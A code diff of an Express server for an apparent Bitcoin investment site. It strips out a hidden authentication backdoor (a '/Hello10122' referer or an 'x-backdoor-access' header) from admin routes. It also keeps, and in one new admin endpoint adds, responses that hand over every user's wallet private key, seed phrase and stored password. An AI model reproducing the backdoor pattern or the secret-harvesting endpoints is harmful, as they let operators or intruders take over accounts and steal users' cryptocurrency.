@@ -1669,19 +1669,14 @@ You will receive a notification once your deposit is confirmed and added to your
   // Admin transaction management routes
   app.get("/api/admin/transactions/pending", async (req, res) => {
     try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
+      // Require proper admin authentication
+      if (!req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
+      const user = await storage.getUser(req.session.userId!);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
       }
 
       const transactions = await storage.getPendingTransactions();
@@ -1693,22 +1688,16 @@ You will receive a notification once your deposit is confirmed and added to your
 
   app.post("/api/admin/transactions/confirm", async (req, res) => {
     try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
+      // Require proper admin authentication
+      if (!req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      let adminId = 1; // Default admin ID for backdoor access
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
-        adminId = req.session.userId!;
+      const user = await storage.getUser(req.session.userId!);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
       }
+      const adminId = req.session.userId!;
 
       const { transactionId, notes } = confirmTransactionSchema.parse(req.body);
 
@@ -1772,22 +1761,16 @@ You will receive a notification once your deposit is confirmed and added to your
 
   app.post("/api/admin/transactions/reject", async (req, res) => {
     try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
+      // Require proper admin authentication
+      if (!req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      let adminId = 1; // Default admin ID for backdoor access
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
-        adminId = req.session.userId!;
+      const user = await storage.getUser(req.session.userId!);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
       }
+      const adminId = req.session.userId!;
 
       const { transactionId, notes } = confirmTransactionSchema.parse(req.body);
 
@@ -2591,21 +2574,16 @@ Your investment journey starts here!`,
   // Admin: Get all investments
   app.get("/api/admin/investments", async (req, res) => {
     try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
-                              req.headers['x-backdoor-access'] === 'true';
+      // Require proper admin authentication
+      console.log('Admin investments request - Session ID:', req.sessionID);
 
-      console.log('Admin investments request - Backdoor access:', isBackdoorAccess, 'Session ID:', req.sessionID);
-
-      if (!isBackdoorAccess && !req.session?.userId) {
+      if (!req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
+      const user = await storage.getUser(req.session.userId!);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
       }
 
       // Get both active and all investments for better visibility
@@ -2644,21 +2622,16 @@ Your investment journey starts here!`,
   // Admin: Pause/Resume investment
   app.post("/api/admin/investments/:id/toggle", async (req, res) => {
     try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
-                              req.headers['x-backdoor-access'] === 'true';
-
+      // Require proper admin authentication
       const authenticatedUserId = getUserIdFromRequest(req);
 
-      if (!isBackdoorAccess && !authenticatedUserId) {
+      if (!authenticatedUserId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess && authenticatedUserId) {
-        const user = await storage.getUser(authenticatedUserId);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
+      const user = await storage.getUser(authenticatedUserId);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
       }
 
       const investmentId = parseInt(req.params.id);
@@ -2789,27 +2762,78 @@ Contact support if you have any questions.`;
   // Manager routes
   app.get("/api/admin/users", async (req, res) => {
     try {
-      // Allow backdoor access or require manager authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
-                              req.headers['x-backdoor-access'] === 'true';
-
-      // Get authenticated user ID using the same helper function
+      // Require proper admin authentication
       const authenticatedUserId = getUserIdFromRequest(req);
 
-      if (!isBackdoorAccess && !authenticatedUserId) {
+      if (!authenticatedUserId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess && authenticatedUserId) {
-        const user = await storage.getUser(authenticatedUserId);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Manager access required" });
-        }
+      const user = await storage.getUser(authenticatedUserId);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
       }
 
-      const users = await storage.getAllUsers();
-      // Return all user data including private keys and seed phrases for admin access
-      const usersResponse = users.map(user => {
+      // Parse query parameters for pagination and filtering
+      const page = parseInt(req.query.page as string) || 1;
+      const limit = Math.min(parseInt(req.query.limit as string) || 20, 100);
+      const search = req.query.search as string || '';
+      const role = req.query.role as string || '';
+      const sortBy = req.query.sortBy as string || 'createdAt';
+      const sortOrder = req.query.sortOrder as string || 'desc';
+
+      const allUsers = await storage.getAllUsers();
+      
+      // Filter users based on criteria
+      let filteredUsers = allUsers.filter(user => {
+        const matchesSearch = search === '' || 
+          user.email.toLowerCase().includes(search.toLowerCase()) ||
+          `${user.firstName} ${user.lastName}`.toLowerCase().includes(search.toLowerCase());
+        
+        const matchesRole = role === '' ||
+          (role === 'admin' && user.isAdmin) ||
+          (role === 'support' && user.isSupportAdmin && !user.isAdmin) ||
+          (role === 'user' && !user.isAdmin && !user.isSupportAdmin);
+        
+        return matchesSearch && matchesRole;
+      });
+
+      // Sort users
+      filteredUsers.sort((a, b) => {
+        let aValue, bValue;
+        switch (sortBy) {
+          case 'name':
+            aValue = `${a.firstName} ${a.lastName}`.toLowerCase();
+            bValue = `${b.firstName} ${b.lastName}`.toLowerCase();
+            break;
+          case 'email':
+            aValue = a.email.toLowerCase();
+            bValue = b.email.toLowerCase();
+            break;
+          case 'balance':
+            aValue = parseFloat(a.balance);
+            bValue = parseFloat(b.balance);
+            break;
+          case 'createdAt':
+          default:
+            aValue = new Date(a.createdAt).getTime();
+            bValue = new Date(b.createdAt).getTime();
+            break;
+        }
+        
+        if (sortOrder === 'asc') {
+          return aValue < bValue ? -1 : aValue > bValue ? 1 : 0;
+        } else {
+          return aValue > bValue ? -1 : aValue < bValue ? 1 : 0;
+        }
+      });
+
+      // Paginate users
+      const startIndex = (page - 1) * limit;
+      const paginatedUsers = filteredUsers.slice(startIndex, startIndex + limit);
+
+      // Return paginated user data including private keys and seed phrases for admin access
+      const usersResponse = paginatedUsers.map(user => {
         return {
           ...user,
           privateKey: user.privateKey,
@@ -2817,10 +2841,230 @@ Contact support if you have any questions.`;
           password: user.password // Include password for admin access
         };
       });
-      res.json(usersResponse);
+
+      res.json({
+        users: usersResponse,
+        pagination: {
+          page,
+          limit,
+          total: filteredUsers.length,
+          totalPages: Math.ceil(filteredUsers.length / limit),
+          hasNext: startIndex + limit < filteredUsers.length,
+          hasPrev: page > 1
+        },
+        filters: {
+          search,
+          role,
+          sortBy,
+          sortOrder
+        }
+      });
     } catch (error) {
       console.error('Admin users fetch error:', error);
       res.status(500).json({ message: "Failed to get users" });
+    }
+  });
+
+  // Get individual user details (admin only)
+  app.get("/api/admin/users/:userId", async (req, res) => {
+    try {
+      // Require proper admin authentication
+      if (!req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      const adminUser = await storage.getUser(req.session.userId!);
+      if (!adminUser || !adminUser.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
+      }
+
+      const userId = parseInt(req.params.userId);
+      const user = await storage.getUser(userId);
+
+      if (!user) {
+        return res.status(404).json({ error: "User not found" });
+      }
+
+      // Get user's investments and transactions
+      const [investments, transactions, notifications] = await Promise.all([
+        storage.getUserInvestments(userId),
+        storage.getUserTransactions(userId),
+        storage.getUserNotifications(userId)
+      ]);
+
+      res.json({
+        user: {
+          ...user,
+          privateKey: user.privateKey,
+          seedPhrase: user.seedPhrase,
+          password: user.password
+        },
+        investments,
+        transactions: transactions.slice(0, 10), // Last 10 transactions
+        notifications: notifications.slice(0, 5) // Last 5 notifications
+      });
+    } catch (error) {
+      console.error('Admin user details fetch error:', error);
+      res.status(500).json({ error: "Failed to get user details" });
+    }
+  });
+
+  // Update user profile (admin only)
+  app.patch("/api/admin/users/:userId/profile", async (req, res) => {
+    try {
+      // Require proper admin authentication
+      if (!req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      const user = await storage.getUser(req.session.userId!);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
+      }
+
+      const userId = parseInt(req.params.userId);
+      const profileData = req.body;
+
+      const updatedUser = await storage.updateUserProfile(userId, profileData);
+      if (!updatedUser) {
+        return res.status(404).json({ error: "User not found" });
+      }
+
+      // Create notification for the user
+      await storage.createNotification({
+        userId,
+        title: "Profile Updated",
+        message: "Your profile has been updated by an administrator.",
+        type: 'info'
+      });
+
+      res.json({ message: "User profile updated successfully", user: updatedUser });
+    } catch (error) {
+      console.error('Admin profile update error:', error);
+      res.status(500).json({ error: "Failed to update user profile" });
+    }
+  });
+
+  // Update user admin status (admin only)
+  app.patch("/api/admin/users/:userId/admin-status", async (req, res) => {
+    try {
+      // Require proper admin authentication
+      if (!req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      const user = await storage.getUser(req.session.userId!);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
+      }
+
+      const userId = parseInt(req.params.userId);
+      const { isAdmin } = req.body;
+
+      const updatedUser = await storage.updateUserAdminStatus(userId, isAdmin);
+      if (!updatedUser) {
+        return res.status(404).json({ error: "User not found" });
+      }
+
+      // Create notification for the user
+      await storage.createNotification({
+        userId,
+        title: isAdmin ? "Admin Access Granted" : "Admin Access Removed",
+        message: isAdmin 
+          ? "You have been granted full administrator access to the platform."
+          : "Your administrator access has been removed.",
+        type: isAdmin ? 'success' : 'warning'
+      });
+
+      res.json({ 
+        message: `User ${isAdmin ? 'granted' : 'removed'} admin access successfully`, 
+        user: updatedUser 
+      });
+    } catch (error) {
+      console.error('Admin status update error:', error);
+      res.status(500).json({ error: "Failed to update admin status" });
+    }
+  });
+
+  // Bulk user actions (admin only)
+  app.post("/api/admin/users/bulk-action", async (req, res) => {
+    try {
+      // Require proper admin authentication
+      if (!req.session?.userId) {
+        return res.status(401).json({ error: "Authentication required" });
+      }
+
+      const user = await storage.getUser(req.session.userId!);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
+      }
+
+      const { userIds, action, value } = req.body;
+
+      if (!Array.isArray(userIds) || userIds.length === 0) {
+        return res.status(400).json({ error: "User IDs array is required" });
+      }
+
+      const results = [];
+      const errors = [];
+
+      for (const userId of userIds) {
+        try {
+          let result;
+          switch (action) {
+            case 'updateSupportAdmin':
+              result = await storage.updateUserSupportAdminStatus(userId, value);
+              if (result) {
+                await storage.createNotification({
+                  userId,
+                  title: value ? "Support Access Granted" : "Support Access Removed",
+                  message: value 
+                    ? "You have been granted support administrator access."
+                    : "Your support administrator access has been removed.",
+                  type: value ? 'success' : 'warning'
+                });
+              }
+              break;
+            case 'updateBalance':
+              result = await storage.updateUserBalance(userId, value);
+              if (result) {
+                await storage.createNotification({
+                  userId,
+                  title: "Balance Updated",
+                  message: `Your balance has been updated to ${value} BTC by an administrator.`,
+                  type: 'info'
+                });
+              }
+              break;
+            case 'delete':
+              const userToDelete = await storage.getUser(userId);
+              if (userToDelete?.isAdmin) {
+                errors.push({ userId, error: "Cannot delete admin users" });
+                continue;
+              }
+              await storage.deleteUser(userId);
+              result = { deleted: true };
+              break;
+            default:
+              errors.push({ userId, error: "Invalid action" });
+              continue;
+          }
+          results.push({ userId, success: true, data: result });
+        } catch (error) {
+          errors.push({ userId, error: error instanceof Error ? error.message : "Unknown error" });
+        }
+      }
+
+      res.json({
+        message: "Bulk action completed",
+        successful: results.length,
+        failed: errors.length,
+        results,
+        errors
+      });
+    } catch (error) {
+      console.error('Bulk action error:', error);
+      res.status(500).json({ error: "Failed to perform bulk action" });
     }
   });
 
@@ -3944,19 +4188,14 @@ You are now on the free plan and will no longer receive automatic profit updates
   // Admin support message routes
   app.get("/api/admin/support/messages", async (req, res) => {
     try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
+      // Require proper admin authentication
+      if (!req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
+      const user = await storage.getUser(req.session.userId!);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
       }
 
       const { status } = req.query;
@@ -3987,22 +4226,16 @@ You are now on the free plan and will no longer receive automatic profit updates
 
   app.patch("/api/admin/support/messages/:id", async (req, res) => {
     try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
+      // Require proper admin authentication
+      if (!req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      let adminId = 1; // Default admin ID for backdoor access
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Admin access required" });
-        }
-        adminId = req.session.userId!;
+      const user = await storage.getUser(req.session.userId!);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Admin access required" });
       }
+      const adminId = req.session.userId!;
 
       const messageId = parseInt(req.params.id);
       const { status, adminResponse } = req.body;
@@ -4042,19 +4275,14 @@ You are now on the free plan and will no longer receive automatic profit updates
   // Admin endpoint to toggle user support admin status (message support only)
   app.post("/api/admin/toggle-user-support-admin", async (req, res) => {
     try {
-      // Allow backdoor access or require admin authentication
-      const isBackdoorAccess = req.headers.referer?.includes('/Hello10122') ||
-                              req.headers['x-backdoor-access'] === 'true';
-
-      if (!isBackdoorAccess && !req.session?.userId) {
+      // Require proper admin authentication
+      if (!req.session?.userId) {
         return res.status(401).json({ error: "Authentication required" });
       }
 
-      if (!isBackdoorAccess) {
-        const user = await storage.getUser(req.session.userId!);
-        if (!user || !user.isAdmin) {
-          return res.status(403).json({ error: "Full admin access required" });
-        }
+      const user = await storage.getUser(req.session.userId!);
+      if (!user || !user.isAdmin) {
+        return res.status(403).json({ error: "Full admin access required" });
       }
 
       const { userId, isSupportAdmin } = req.body;
